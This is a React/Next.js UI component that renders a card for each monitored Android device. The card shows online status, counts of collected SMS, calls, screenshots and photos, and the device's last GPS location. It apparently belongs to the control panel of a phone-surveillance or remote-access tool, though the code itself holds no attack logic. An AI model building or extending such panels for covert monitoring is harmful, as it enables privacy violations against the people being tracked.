'use client';

import Link from 'next/link';
import { formatDistanceToNow } from 'date-fns';
import {
    Smartphone,
    MapPin,
    MessageSquare,
    Phone,
    Camera,
    Image,
    ChevronRight,
    Wifi,
    WifiOff,
} from 'lucide-react';

interface DeviceCardProps {
    device: {
        id: string;
        deviceId: string;
        model?: string;
        manufacturer?: string;
        androidVersion?: string;
        isOnline: boolean;
        lastSeen: string;
        latestLocation?: {
            latitude: number;
            longitude: number;
        };
        stats?: {
            sms: number;
            calls: number;
            screenshots: number;
            photos: number;
        };
    };
}

export default function DeviceCard({ device }: DeviceCardProps) {
    const lastSeenText = formatDistanceToNow(new Date(device.lastSeen), {
        addSuffix: true,
    });

    return (
        <Link href={`/devices/view/?id=${device.deviceId}`}>
            <div className="card group relative overflow-hidden bg-white hover:shadow-xl">
                {/* Top accent line */}
                <div className={`absolute top-0 left-0 right-0 h-1 transition-all duration-300 ${device.isOnline
                    ? 'bg-gradient-to-r from-emerald-400 to-teal-400'
                    : 'bg-gradient-to-r from-slate-200 to-slate-300'
                    }`} />

                <div className="relative z-10 pt-2">
                    {/* Header */}
                    <div className="flex items-start justify-between mb-5">
                        <div className="flex items-center gap-4">
                            <div className={`w-14 h-14 rounded-2xl flex items-center justify-center transition-all duration-300 ${device.isOnline
                                ? 'bg-gradient-to-br from-emerald-400 to-teal-500 shadow-lg shadow-emerald-500/20'
                                : 'bg-slate-100 border border-[var(--border)]'
                                }`}>
                                <Smartphone className={`w-7 h-7 ${device.isOnline ? 'text-white' : 'text-slate-400'}`} />
                            </div>
                            <div>
                                <h3 className="font-bold text-lg text-[var(--foreground)] tracking-tight group-hover:text-[var(--primary)] transition-colors">
                                    {device.model || device.manufacturer || 'Unknown Device'}
                                </h3>
                                <div className="flex items-center gap-2 mt-1">
                                    <span className="text-xs font-semibold text-[var(--primary)] bg-[var(--primary-glow)] px-2 py-0.5 rounded-md">
                                        Android {device.androidVersion || '??'}
                                    </span>
                                </div>
                            </div>
                        </div>
                        <div className="flex flex-col items-end gap-2">
                            <span className={`badge ${device.isOnline ? 'badge-online' : 'badge-offline'}`}>
                                {device.isOnline ? (
                                    <><Wifi className="w-3 h-3" /> Online</>
                                ) : (
                                    <><WifiOff className="w-3 h-3" /> Offline</>
                                )}
                            </span>
                        </div>
                    </div>

                    {/* Stats Grid */}
                    <div className="grid grid-cols-4 gap-2 mb-5">
                        {[
                            { icon: MessageSquare, value: device.stats?.sms, label: 'SMS', color: 'blue' },
                            { icon: Phone, value: device.stats?.calls, label: 'Calls', color: 'emerald' },
                            { icon: Image, value: device.stats?.screenshots, label: 'Screens', color: 'purple' },
                            { icon: Camera, value: device.stats?.photos, label: 'Photos', color: 'orange' },
                        ].map((stat, i) => (
                            <div key={i} className="text-center p-2.5 rounded-xl bg-[var(--background)] border border-[var(--border)] group/stat hover:border-[var(--primary)]/20 transition-colors">
                                <stat.icon className={`w-4 h-4 mx-auto mb-1.5 text-${stat.color}-500 group-hover/stat:scale-110 transition-transform`} />
                                <p className="text-sm font-bold text-[var(--foreground)]">{stat.value || 0}</p>
                                <p className="text-[9px] font-semibold text-[var(--muted)] uppercase">{stat.label}</p>
                            </div>
                        ))}
                    </div>

                    {/* Footer */}
                    <div className="flex items-center justify-between pt-4 border-t border-[var(--border)]">
                        <div className="flex items-center gap-2 text-xs font-medium text-[var(--muted)]">
                            <div className={`p-1.5 rounded-lg ${device.latestLocation ? 'bg-blue-50 text-blue-500' : 'bg-slate-50 text-slate-400'}`}>
                                <MapPin className="w-3.5 h-3.5" />
                            </div>
                            {device.latestLocation ? (
                                <span className="font-mono text-[11px]">
                                    {device.latestLocation.latitude.toFixed(4)}, {device.latestLocation.longitude.toFixed(4)}
                                </span>
                            ) : (
                                <span className="italic text-[var(--muted-light)]">No location</span>
                            )}
                        </div>
                        <div className="flex items-center gap-2">
                            <span className="text-[10px] font-semibold text-[var(--muted)] bg-[var(--background)] px-2 py-1 rounded-lg border border-[var(--border)]">
                                {lastSeenText}
                            </span>
                            <ChevronRight className="w-4 h-4 text-[var(--muted-light)] group-hover:text-[var(--primary)] group-hover:translate-x-1 transition-all" />
                        </div>
                    </div>
                </div>
            </div>
        </Link>
    );
}
